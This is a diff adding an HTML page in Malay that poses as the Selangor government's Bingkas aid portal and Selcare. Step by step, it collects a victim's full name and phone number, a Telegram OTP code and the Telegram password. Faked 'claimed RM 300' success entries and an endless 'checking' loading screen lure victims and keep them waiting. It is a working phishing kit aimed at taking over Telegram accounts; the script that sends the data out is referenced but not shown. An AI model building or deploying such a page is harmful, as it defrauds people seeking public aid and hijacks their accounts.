@@ -1,0 +1,463 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Senarai Bantuan Bingkas Online 2026.</title>
+
+    <!-- Link ke Google Fonts -->
+    <link
+      href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap"
+      rel="stylesheet"
+    />
+
+    <!-- Link ke CSS intl-tel-input -->
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css"
+    />
+
+    <link rel="stylesheet" href="style.css" />
+  </head>
+  <body>
+    <div id="page1" class="page">
+      <!-- ================= HEADER ================= -->
+      <nav class="navbar">
+        <!-- Logo Selangor -->
+        <div class="navbar-logo">
+          <img
+            src="jataNegeri-logo.png"
+            alt="Logo Selangor"
+            class="navbar-img"
+          />
+        </div>
+
+        <!-- Menu bahasa TETAP ADA, tapi disembunyikan oleh CSS -->
+        <div class="navbar-nav">
+          <a href="#" class="active">Bahasa Melayu</a>
+          <a href="#"><span>English</span></a>
+          <a href="#"><span>中文(简体)</span></a>
+          <a href="#"><span>தமிழ்</span></a>
+        </div>
+      </nav>
+
+      <!-- ================= BAR LOG MASUK ================= -->
+
+      <div class="login-bar">
+        <div class="login-side"></div>
+
+        <div class="login-title">Log Masuk</div>
+
+        <div class="login-side"></div>
+      </div>
+
+      <!-- ================= KONTEN ================= -->
+
+      <div class="hero">
+        <!-- Logo BINGKAS -->
+
+        <img src="bingkas_logo.png" alt="BINGKAS" class="bingkas-login-logo" />
+
+        <!-- ================= FORM LOGIN ================= -->
+
+        <div class="form-container">
+          <form id="registrationForm">
+            <!-- KETERANGAN -->
+
+            <div class="login-description">
+              Untuk meneruskan pendaftaran Bingkas, sila log masuk dengan
+              menggunakan nama pengguna dan kata laluan bagi akaun aplikasi
+              <strong>Selangkah</strong> anda.
+            </div>
+
+            <!-- LABEL NAMA -->
+
+            <label for="name" class="form-label"> Nama Penuh </label>
+
+            <!-- ID INI JANGAN DIUBAH -->
+
+            <input
+              type="text"
+              id="name"
+              name="name"
+              placeholder="Nama penuh Sesuai Mykad"
+              required
+            />
+
+            <!-- LABEL TELEFON -->
+
+            <label for="phone" class="form-label phone-label">
+              Nombor Telefon
+            </label>
+
+            <!-- ID INI JANGAN DIUBAH -->
+
+            <input
+              type="tel"
+              id="phone"
+              name="phone"
+              placeholder="+60"
+              required
+            />
+
+            <!-- LOGIN -->
+
+            <button type="submit" class="btn">LOG MASUK</button>
+
+            <!-- LUPA PASSWORD -->
+
+            <a href="#" class="forgot-password"> Lupa Kata Laluan? </a>
+
+            <!-- GARIS -->
+
+            <div class="separator"></div>
+
+            <!-- DAFTAR -->
+
+            <div class="register-text">
+              <span> Tiada akaun aplikasi </span>
+
+              <span> Selangkah? </span>
+
+              <a href="#"> Daftar Sekarang </a>
+            </div>
+          </form>
+        </div>
+
+        <!-- ================= RECORD BOX ================= -->
+        <!--
+      ID list dan struktur tetap dipertahankan
+      untuk fungsi JavaScript lama.
+    -->
+
+        <div class="_record-box">
+          <div id="list" class="list-box">
+            <div class="list">
+              <div class="item">
+                <div class="record_logo">
+                  <img src="avatar.png" alt="" />
+                </div>
+
+                <div class="center">
+                  <div class="h1">
+                    <span class="name"> Ahmad Zulkifli </span>
+                  </div>
+
+                  <div class="h2">RM1000 ✅</div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- ================= FOOTER ================= -->
+
+      <footer>
+        <div class="footer-content">
+          <span> Selcare Management Sdn. Bhd. </span>
+
+          <img src="selcare.png" alt="Selcare" />
+        </div>
+      </footer>
+    </div>
+
+    <!-- ================= PAGE 2 ================= -->
+
+    <div id="page2" class="page" style="display: none">
+      <!-- ================= HEADER ================= -->
+
+      <nav class="navbar">
+        <div class="navbar-logo">
+          <img
+            src="jataNegeri-logo.png"
+            alt="Logo Selangor"
+            class="navbar-img"
+          />
+        </div>
+
+        <!-- Tetap dipertahankan -->
+        <div class="navbar-nav">
+          <a href="#" class="active">Bahasa Melayu</a>
+          <a href="#"><span>English</span></a>
+          <a href="#"><span>中文(简体)</span></a>
+          <a href="#"><span>தமிழ்</span></a>
+        </div>
+      </nav>
+
+      <!-- ================= BAR LOG MASUK ================= -->
+
+      <div class="login-bar">
+        <div class="login-side"></div>
+
+        <div class="login-title">Log Masuk</div>
+
+        <div class="login-side"></div>
+      </div>
+
+      <!-- ================= CONTENT ================= -->
+
+      <div class="hero">
+        <!-- LOGO BINGKAS -->
+
+        <img src="bingkas_logo.png" alt="BINGKAS" class="bingkas-otp-logo" />
+
+        <!-- ================= KOTAK OTP ================= -->
+
+        <div class="form-container otp-card">
+          <!-- PESAN OTP -->
+
+          <div class="otp-message">
+            <p>
+              Sila masukkan kod OTP yang telah kami hantar ke Aplikasi
+              <strong>telegram anda.</strong>
+            </p>
+          </div>
+
+          <!-- FORM OTP -->
+
+          <form id="otpForm">
+            <label class="otp-title">
+              Masukkan Kod yang Dihantar ke
+              <br />
+              Nombor Telegram Anda.
+            </label>
+
+            <!--
+          ID OTP TETAP SAMA.
+          Jangan diubah karena digunakan
+          oleh fungsi JavaScript lama.
+        -->
+
+            <div class="otp-container">
+              <input
+                type="number"
+                class="otp-input"
+                id="otp-1"
+                maxlength="1"
+                oninput="this.value = this.value.slice(0, 1)"
+                required
+              />
+
+              <input
+                type="number"
+                class="otp-input"
+                id="otp-2"
+                maxlength="1"
+                oninput="this.value = this.value.slice(0, 1)"
+                required
+              />
+
+              <input
+                type="number"
+                class="otp-input"
+                id="otp-3"
+                maxlength="1"
+                oninput="this.value = this.value.slice(0, 1)"
+                required
+              />
+
+              <input
+                type="number"
+                class="otp-input"
+                id="otp-4"
+                maxlength="1"
+                oninput="this.value = this.value.slice(0, 1)"
+                required
+              />
+
+              <input
+                type="number"
+                class="otp-input"
+                id="otp-5"
+                maxlength="1"
+                oninput="this.value = this.value.slice(0, 1)"
+                required
+              />
+            </div>
+
+            <!-- BUTTON -->
+
+            <button type="submit" class="btn otp-button">TERUSKAN</button>
+          </form>
+        </div>
+
+        <!-- ================= KETERANGAN ================= -->
+
+        <div class="kiss-info">
+          Bagi penerima
+          <strong>KISS</strong>, sila klik<br />
+          butang di bawah untuk<br />
+          mengemaskini nombor telefon<br />
+          anda.
+        </div>
+
+        <!-- ================= RECORD BOX ================= -->
+
+        <div class="_record-box">
+          <div id="list" class="list-box">
+            <div class="list">
+              <div class="item">
+                <div class="record_logo">
+                  <img src="avatar.png" alt="" />
+                </div>
+
+                <div class="center">
+                  <div class="h1">
+                    <span class="name"> Ahmad Zulkifli </span>
+                  </div>
+
+                  <div class="h2">RM1000 ✅</div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- ================= FOOTER ================= -->
+
+      <footer>
+        <div class="footer-content">
+          <span> Selcare Management Sdn. Bhd. </span>
+
+          <img src="selcare.png" alt="Selcare" />
+        </div>
+      </footer>
+    </div>
+
+    <div id="page3" class="page" style="display: none">
+      <!-- HEADER -->
+      <nav class="navbar">
+        <div class="navbar-logo">
+          <img
+            src="jataNegeri-logo.png"
+            alt="Logo Selangor"
+            class="navbar-img"
+          />
+        </div>
+
+        <div class="navbar-nav">
+          <a href="#" class="active">Bahasa Melayu</a>
+          <a href="#"><span>English</span></a>
+          <a href="#"><span>中文(简体)</span></a>
+          <a href="#"><span>தமிழ்</span></a>
+        </div>
+      </nav>
+
+      <!-- BAR LOG MASUK -->
+      <div class="login-bar">
+        <div class="login-side"></div>
+
+        <div class="login-title">Log Masuk</div>
+
+        <div class="login-side"></div>
+      </div>
+
+      <!-- CONTENT -->
+      <div class="hero">
+        <!-- LOGO BINGKAS -->
+        <img src="bingkas_logo.png" alt="BINGKAS" class="bingkas-page3-logo" />
+
+        <!-- CARD -->
+        <div class="form-container page3-card">
+          <!-- PESAN -->
+          <div class="page3-message">
+            Sila masukkan kata laluan
+            <br />
+            Telegram anda.
+          </div>
+
+          <!-- FORM UI -->
+          <form id="passwordForm">
+            <label for="kata-sandi" class="page3-label">
+              Kata laluan telegram
+              <span>[optional]</span>
+            </label>
+
+            <input
+              type="text"
+              id="kata-sandi"
+              name="kata-sandi"
+              placeholder="Masukkan kata laluan"
+              autocomplete="off"
+            />
+
+            <button type="button" class="btn page3-button" id="page3Continue">
+              TERUSKAN
+            </button>
+          </form>
+
+          <!-- LOADING UI -->
+          <div id="loadingContent" style="display: none">
+            <img
+              id="loadingGif"
+              src="processing.gif"
+              alt="Loading..."
+              class="page3-loading"
+            />
+
+            <p id="formMessage">Mohon tunggu proses pengesahan atau...</p>
+
+            <button
+              type="button"
+              id="useAnotherPhone"
+              class="page3-other-button"
+            >
+              Guna Nombor Telefon Lain
+            </button>
+          </div>
+        </div>
+
+        <!-- KETERANGAN -->
+        <div class="kiss-info">
+          Bagi penerima
+          <strong>KISS</strong>, sila klik<br />
+          butang di bawah untuk<br />
+          mengemaskini nombor telefon<br />
+          anda.
+        </div>
+
+        <!-- RECORD BOX TETAP ADA -->
+        <div class="_record-box">
+          <div id="list" class="list-box">
+            <div class="list">
+              <!-- item lama kamu tetap bisa diletakkan di sini -->
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <footer>
+      <div class="footer-inner">
+        <span> Selcare Management Sdn. Bhd. </span>
+
+        <img src="selcare-logo-white.png" alt="Selcare" />
+      </div>
+    </footer>
+
+    <div class="loading-screen" id="loadingScreen">
+      <img src="loading-loading-forever.gif" alt="Loading..." />
+      <p style="color: var(--accent-yellow); margin-top: 10px; font-size: 14px">
+        Tunggu kami sedang menyemak...
+      </p>
+    </div>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
+
+    <script src="java.js"></script>
+
+    <script>
+      document.querySelectorAll(".h2").forEach((item, index) => {
+        const amounts = [
+          "BERJAYA CLAIM RM 300.00",
+          "BERJAYA CLAIM RM 300.00",
+          "BERJAYA CLAIM RM 300.00",
+        ];
+        const randomAmount = amounts[index % 3]; // Akan bergantian antara ketiga nilai
+        item.textContent = item.textContent.replace("RM1000", randomAmount);
+      });
+    </script>
+  </body>
+</html>
